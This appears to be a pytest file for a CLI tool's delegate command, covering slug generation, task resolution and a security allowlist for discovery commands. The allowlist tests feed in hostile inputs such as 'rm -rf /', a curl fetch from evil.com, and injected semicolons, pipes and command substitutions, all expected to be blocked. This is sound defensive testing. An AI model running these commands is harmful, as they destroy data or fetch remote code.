"""Tests for delegate command helper functions."""

import pytest
from unittest.mock import patch

import click.exceptions
import typer

from emdx.commands.delegate import (
    _slugify_title,
    _resolve_task,
    _validate_discovery_command,
    _SAFE_DISCOVERY_COMMANDS,
    PR_INSTRUCTION,
)


class TestSlugifyTitle:
    """Tests for _slugify_title — converts document titles to git branch slugs."""

    def test_simple_title(self):
        assert _slugify_title("Fix auth bug") == "fix-auth-bug"

    def test_strips_gameplan_prefix(self):
        assert _slugify_title("Gameplan #1: Contextual Save") == "contextual-save"

    def test_strips_feature_prefix(self):
        assert _slugify_title("Feature: Dark Mode Toggle") == "dark-mode-toggle"

    def test_strips_plan_prefix(self):
        assert _slugify_title("Plan #42: Refactor Database") == "refactor-database"

    def test_strips_doc_prefix(self):
        assert _slugify_title("Document: API Design") == "api-design"

    def test_removes_special_characters(self):
        assert _slugify_title("Smart Priming (context-aware)") == "smart-priming-context-aware"

    def test_collapses_whitespace(self):
        assert _slugify_title("fix   the   thing") == "fix-the-thing"

    def test_truncates_long_slugs(self):
        result = _slugify_title("A" * 100)
        assert len(result) <= 50

    def test_empty_after_strip_returns_feature(self):
        assert _slugify_title("Gameplan #1:") == "feature"

    def test_only_special_chars_returns_feature(self):
        assert _slugify_title("!!!???") == "feature"

    def test_no_trailing_hyphens(self):
        result = _slugify_title("test - ")
        assert not result.endswith("-")


class TestResolveTask:
    """Tests for _resolve_task — resolves doc IDs to content."""

    @patch("emdx.commands.delegate.get_document")
    def test_numeric_id_loads_doc(self, mock_get):
        mock_get.return_value = {
            "id": 42,
            "title": "Test Doc",
            "content": "Hello world",
        }
        result = _resolve_task("42")
        assert "Hello world" in result
        assert "Test Doc" in result
        mock_get.assert_called_once_with(42)

    @patch("emdx.commands.delegate.get_document")
    def test_numeric_id_with_pr_adds_instructions(self, mock_get):
        mock_get.return_value = {
            "id": 42,
            "title": "Fix Auth",
            "content": "Fix the authentication bug",
        }
        result = _resolve_task("42", pr=True)
        assert "Fix the authentication bug" in result
        assert "pull request" in result.lower() or "PR" in result

    def test_text_task_returned_as_is(self):
        result = _resolve_task("analyze the auth module")
        assert result == "analyze the auth module"

    @patch("emdx.commands.delegate.get_document")
    def test_missing_doc_falls_back(self, mock_get):
        mock_get.return_value = None
        result = _resolve_task("99999")
        # Should return the string as-is when doc not found
        assert "99999" in result


class TestPRInstruction:
    """Tests for PR instruction constant."""

    def test_pr_instruction_mentions_branch(self):
        assert "branch" in PR_INSTRUCTION.lower()

    def test_pr_instruction_mentions_pr_create(self):
        assert "gh pr create" in PR_INSTRUCTION


class TestValidateDiscoveryCommand:
    """Tests for _validate_discovery_command — security allowlist for --each.

    SECURITY: These tests verify that command injection attacks are blocked.
    The --each flag only allows safe file-listing commands from an allowlist.
    """

    def test_allows_fd_command(self):
        """fd is a safe file finder."""
        args = _validate_discovery_command("fd -e py src/")
        assert args[0] == "fd"
        assert "-e" in args
        assert "py" in args

    def test_allows_find_command(self):
        """find is a standard file finder."""
        args = _validate_discovery_command("find . -name '*.py'")
        assert args[0] == "find"

    def test_allows_git_ls_files(self):
        """git ls-files is safe for listing tracked files."""
        args = _validate_discovery_command("git ls-files")
        assert args[0] == "git"
        assert "ls-files" in args

    def test_allows_rg_files_with_matches(self):
        """rg --files-with-matches is safe."""
        args = _validate_discovery_command("rg --files-with-matches pattern")
        assert args[0] == "rg"

    def test_allows_ls_command(self):
        """ls is a basic directory lister."""
        args = _validate_discovery_command("ls src/")
        assert args[0] == "ls"

    def test_allows_full_path_to_safe_command(self):
        """/usr/bin/fd should be allowed (extracts basename)."""
        args = _validate_discovery_command("/usr/bin/fd -e py")
        assert "/usr/bin/fd" in args[0]

    def test_blocks_arbitrary_commands(self):
        """Commands not in allowlist must be rejected."""
        with pytest.raises(click.exceptions.Exit):
            _validate_discovery_command("rm -rf /")

    def test_blocks_curl(self):
        """curl could download malicious scripts."""
        with pytest.raises(click.exceptions.Exit):
            _validate_discovery_command("curl https://evil.com/script.sh")

    def test_blocks_bash(self):
        """bash could execute arbitrary code."""
        with pytest.raises(click.exceptions.Exit):
            _validate_discovery_command("bash -c 'echo pwned'")

    def test_blocks_python(self):
        """python could execute arbitrary code."""
        with pytest.raises(click.exceptions.Exit):
            _validate_discovery_command("python -c 'import os; os.system(\"rm -rf /\")'")

    def test_blocks_shell_semicolon_injection(self):
        """Semicolons in arguments are rejected."""
        with pytest.raises(click.exceptions.Exit):
            _validate_discovery_command("fd -e py; rm -rf /")

    def test_blocks_shell_pipe_injection(self):
        """Pipe characters in arguments are rejected."""
        with pytest.raises(click.exceptions.Exit):
            _validate_discovery_command("fd -e py | xargs rm")

    def test_blocks_shell_ampersand_injection(self):
        """Ampersands in arguments are rejected."""
        with pytest.raises(click.exceptions.Exit):
            _validate_discovery_command("fd -e py && rm -rf /")

    def test_blocks_command_substitution(self):
        """Command substitution ($(...)) is rejected."""
        with pytest.raises(click.exceptions.Exit):
            _validate_discovery_command("fd $(rm -rf /)")

    def test_blocks_backtick_substitution(self):
        """Backtick substitution is rejected."""
        with pytest.raises(click.exceptions.Exit):
            _validate_discovery_command("fd `rm -rf /`")

    def test_blocks_empty_command(self):
        """Empty commands are rejected."""
        with pytest.raises(click.exceptions.Exit):
            _validate_discovery_command("")

    def test_blocks_whitespace_only(self):
        """Whitespace-only commands are rejected."""
        with pytest.raises(click.exceptions.Exit):
            _validate_discovery_command("   ")

    def test_safe_commands_constant_is_frozen(self):
        """The allowlist should be immutable."""
        assert isinstance(_SAFE_DISCOVERY_COMMANDS, frozenset)

    def test_safe_commands_includes_expected_tools(self):
        """Verify expected tools are in the allowlist."""
        expected = {"fd", "find", "git", "rg", "ls"}
        assert expected.issubset(_SAFE_DISCOVERY_COMMANDS)
